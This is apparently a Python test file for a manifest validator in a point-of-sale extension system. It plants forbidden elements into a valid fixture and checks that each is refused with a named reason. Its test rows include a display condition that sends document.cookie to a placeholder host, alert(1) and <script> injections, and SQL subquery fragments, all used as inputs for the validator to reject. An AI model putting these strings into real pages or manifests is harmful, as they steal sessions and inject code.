"""Manifest v2 validator tests — stdlib only, no bench:  python3 -m unittest discover -s tools/manifest/tests -v

The v2 fixture passes; each forbidden v2 element, planted into it, is refused with its own named reason and with
nothing else (so a refusal can never be satisfied by a different rule firing). Every refusal the v2 kinds add has a row."""

import copy
import json
import pathlib
import sys
import unittest
from unittest.mock import patch

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from validate import POINT_KINDS, validate  # noqa: E402

V2 = json.loads((HERE / "fixtures/full_v2_ok.json").read_text())
KEY = {"key": "tsv_check", "label": "Claim check", "endpoint_url": "https://partner.example/tsv",
       "partner_name": "PP TSV"}


def planted(change):
    m = copy.deepcopy(V2)
    change(m)
    return validate(m)


def key(**k):
    return lambda m: m.update(remote_keys=[dict(KEY, **k)])


def first(kind, **k):
    return lambda m: m[kind][0].update(k)


class GoodV2(unittest.TestCase):
    def test_a_plain_display_condition_passes(self):
        m = copy.deepcopy(V2)
        m["doctypes"][0]["fields"][2].update(depends_on="eval:doc.status=='Open' || doc.amount > 0".replace(" > 0", "!=0"))
        m["doctypes"][0]["fields"][3].update(depends_on="customer")
        self.assertEqual(validate(m), [])

    def test_the_v2_fixture_passes(self):
        self.assertEqual(validate(V2), [])

    def test_a_remote_key_left_for_the_shop_to_switch_on_passes(self):
        self.assertEqual(planted(key()), [])

    def test_a_v1_manifest_still_passes_unchanged(self):
        v1 = json.loads((HERE / "fixtures/full_ok.json").read_text())
        self.assertEqual(v1["manifest_version"], 1)
        self.assertEqual(validate(v1), [])


FORBIDDEN = [
    ("a query report", first("reports", report_type="Query Report"), "SQL text"),
    ("a script report", first("reports", report_type="Script Report"), "Python run inside"),
    ("a report column the record type lacks", first("reports", columns=["title", "nope"]), "columns not on"),
    ("a report opened to visitors", first("reports", roles=["Guest"]), "visitors"),
    ("a custom number card", first("number_cards", type="Custom"), "server method"),
    ("a Sum card without its field", lambda m: m["number_cards"][1].pop("aggregate_function_based_on"), "names its field"),
    ("a custom chart", first("dashboard_charts", chart_type="Custom"), "server method"),
    ("a report chart", first("dashboard_charts", chart_type="Report"), "not supported"),
    ("a dashboard holding another's chart", lambda m: m["dashboards"][0]["charts"].append("Sales Trends"),
     "only hold the manifest's own"),
    ("list settings on a shop record type", first("list_settings", doctype="Customer"), "one list setting"),
    ("a workflow on a shop record type", first("workflows", document_type="Customer"),
     "changes how every user and the till"),
    ("a workflow state that submits", lambda m: m["workflows"][0]["states"][2].update(doc_status=1),
     "never submits or cancels"),
    ("a transition condition", lambda m: m["workflows"][0]["transitions"][0].update(condition="doc.amount < 100"),
     "evaluated on the server"),
    ("a transition visitors may take", lambda m: m["workflows"][0]["transitions"][0].update(allowed="Guest"), "not Guest"),
    ("a naming rule on sales", first("naming_rules", document_type="POS Invoice"), "fiscal"),
    ("a Connections link to a shop record type", first("links", link_doctype="Sales Invoice"),
     "lists the manifest's own records"),
    ("a Connections link on the wrong field", first("links", link_fieldname="title"), "must be a Link field"),
    ("a feed registration switched on", first("registered_applications", application_user="x@y.z"), "switches it on"),
    ("a remote key already consented", key(consent_given=1), "stamps the key's consent"),
    ("a remote key switched on", key(enabled=1), "stamps the key's consent"),
    ("a remote key carrying its secret", key(secret="s3cret"), "carries no secret"),
    ("a remote key on plain http", lambda m: (m["allowed_urls"].append("http://partner.example/tsv"),
                                              m.update(remote_keys=[dict(KEY, endpoint_url="http://partner.example/tsv")])),
     "https address"),
    ("a remote key slower than a cashier waits", key(timeout_seconds=9), "at most 5"),
    ("a remote key declaring its consent fields", key(consent_fields=["item_code"]), "stamped by the server"),
    # deep-review folds
    ("an eval: display condition on a shop field", lambda m: m.update(custom_fields=[{
        "dt": "Customer", "fieldname": "pp_tsv_note", "fieldtype": "Data", "label": "Note",
        "depends_on": "eval:fetch('https://x.example/'+document.cookie)"}]), "JavaScript"),
    ("an eval: condition with a call, on the manifest's own field",
     lambda m: m["doctypes"][0]["fields"][1].update(mandatory_depends_on="eval:doc.title=='a'||alert(1)"), "JavaScript"),
    ("an eval: condition reaching outside doc", lambda m: m["doctypes"][0]["fields"][1].update(
        depends_on="eval:doc.status=='Open' && window.x"), "JavaScript"),
    ("an eval: condition through a property setter", lambda m: m.update(
        custom_fields=[{"dt": "Customer", "fieldname": "pp_tsv_note", "fieldtype": "Data", "label": "Note"}],
        property_setters=[{"doc_type": "Customer", "field_name": "pp_tsv_note", "property": "depends_on",
                           "value": "eval:1", "property_type": "Code"}]), "JavaScript"),
    ("a workflow state setting a standard field", lambda m: m["workflows"][0]["states"][2].update(update_field="docstatus"),
     "never a standard one"),
    ("a chart reading something that is not a field", first("dashboard_charts", group_by_based_on="(select 1)"),
     "must be a field"),
    ("a filter on something that is not a field", first("number_cards", filters=[["(select 1)", "=", 1]]),
     "plain operator"),
    ("a dashboard holding an object, not a chart name", lambda m: m["dashboards"][0]["charts"].append({}),
     "only hold the manifest's own"),
    # the coverage fold: one row for every remaining v2 refusal reason
    ("a key a report may not carry", first("reports", javascript="x"), "keys this kind may not carry"),
    ("an unknown report type", first("reports", report_type="Custom Report"), "is not a report type"),
    ("a report with no record type", lambda m: m["reports"][0].pop("ref_doctype"), "must name its record type"),
    ("a report with no columns", first("reports", columns=[]), "columns is a list of field names"),
    ("a report ordered by an expression", first("reports", order_by="amount desc, (select 1)"), "order_by is one field"),
    ("report roles that are not a list", first("reports", roles="System Manager"), "roles is a list"),
    ("a report card type the installer cannot install", first("number_cards", type="Report"), "not supported by this"),
    ("a card with no record type", lambda m: m["number_cards"][0].pop("document_type"), "must name its record type"),
    ("a card function that does not exist", first("number_cards", function="Median"), "not a number-card function"),
    ("a chart type that does not exist", first("dashboard_charts", chart_type="Scatter"), "chart_type is Count"),
    ("a chart with no record type", lambda m: m["dashboard_charts"][0].pop("document_type"), "must name its record type"),
    ("a time chart with no date field", lambda m: m["dashboard_charts"][1].pop("based_on"), "names its date field"),
    ("a group-by chart with no field", lambda m: m["dashboard_charts"][0].pop("group_by_based_on"),
     "names its field (group_by"),
    ("a chart drawn as something else", first("dashboard_charts", type="Heatmap"), "type is Line"),
    ("a dashboard with no chart", first("dashboards", charts=[]), "at least one chart"),
    ("list settings showing a field the type lacks", first("list_settings", fields=["nope"]), "own field names"),
    ("a workflow on a child table", lambda m: (m["doctypes"].append({"name": "PP TSV Line", "istable": 1, "fields": [
        {"fieldname": "note", "fieldtype": "Data", "label": "Note"}]}), m["workflows"][0].update(document_type="PP TSV Line")),
     "not a child table"),
    ("a workflow with one state", lambda m: m["workflows"][0].update(states=m["workflows"][0]["states"][:1],
                                                                     transitions=[]), "at least two states"),
    ("a state that is not an object", lambda m: m["workflows"][0]["states"].append("Closed"), "a state is an object"),
    ("a state with a scripted name", lambda m: m["workflows"][0]["states"].append(
        {"state": "PP <b>x</b>", "allow_edit": "System Manager"}), "plain name"),
    ("a state nobody may edit in", lambda m: m["workflows"][0]["states"][3].pop("allow_edit"), "names the role"),
    ("a state visitors may edit in", lambda m: m["workflows"][0]["states"][3].update(allow_edit="Guest"), "visitors"),
    ("a workflow with no transition", lambda m: m["workflows"][0].update(transitions=[]), "at least one transition"),
    ("a transition that is not an object", lambda m: m["workflows"][0]["transitions"].append("go"),
     "a transition is an object"),
    ("a transition to a state that does not exist", lambda m: m["workflows"][0]["transitions"][0].update(
        next_state="Nowhere"), "is not one of the workflow's states"),
    ("a transition with a scripted action", lambda m: m["workflows"][0]["transitions"][0].update(action="go();"),
     "plain action name"),
    ("a naming prefix with odd characters", first("naming_rules", prefix="TSV<script>"), "prefix is upper-case"),
    ("too many digits", first("naming_rules", prefix_digits=30), "prefix_digits is 1 to 10"),
    ("a naming condition on a field the type lacks", first("naming_rules", conditions=[
        {"field": "nope", "condition": "=", "value": "x"}]), "a condition is"),
    ("a feed registration following nothing", first("registered_applications", events=[]), "events is a list"),
    ("a feed registration switched on (enable)", first("registered_applications", enable=1), "switches it on"),
    ("a remote key with a bad key", key(key="Bad Key"), "key is lower-case"),
    ("a remote key with a long label", key(label="x" * 30), "label is 1 to 24"),
    ("a remote key to an address not listed", key(endpoint_url="https://other.example/x"), "https address"),
    ("a remote key stamping its own consent", key(consent_by="someone"), "stamps the key's consent"),
    ("a receipt_blocks declaration", lambda m: m.update(receipt_blocks=[{"name": "PP TSV x"}]), "Receipt Header and Footer"),
] + [(f"a {k} declaration", (lambda k: lambda m: m.update({k: [{"name": "PP TSV x"}]}))(k), f"until the '{p}' extension point has shipped")
     for k, (p, _) in POINT_KINDS.items()]


class RefusedV2(unittest.TestCase):
    def test_each_forbidden_v2_element_is_refused_with_its_reason(self):
        for label, change, phrase in FORBIDDEN:
            with self.subTest(label):
                refusals = planted(change)
                self.assertEqual(len(refusals), 1, f"{label}: {refusals}")
                self.assertIn(phrase, refusals[0]["reason"], label)

    def test_a_point_kind_is_refused_until_its_extension_point_ships(self):
        # no extension point waits today (POINT_KINDS is empty); a planted one keeps the refusal biting
        with patch.dict(POINT_KINDS, {"pp_later_blocks": ("Later", "spec P-LATER")}):
            refusals = planted(lambda m: m.update(pp_later_blocks=[{}]))
        self.assertEqual(len(refusals), 1, refusals)
        self.assertIn("until the 'Later' extension point has shipped on this site (spec P-LATER)", refusals[0]["reason"])


if __name__ == "__main__":
    unittest.main()
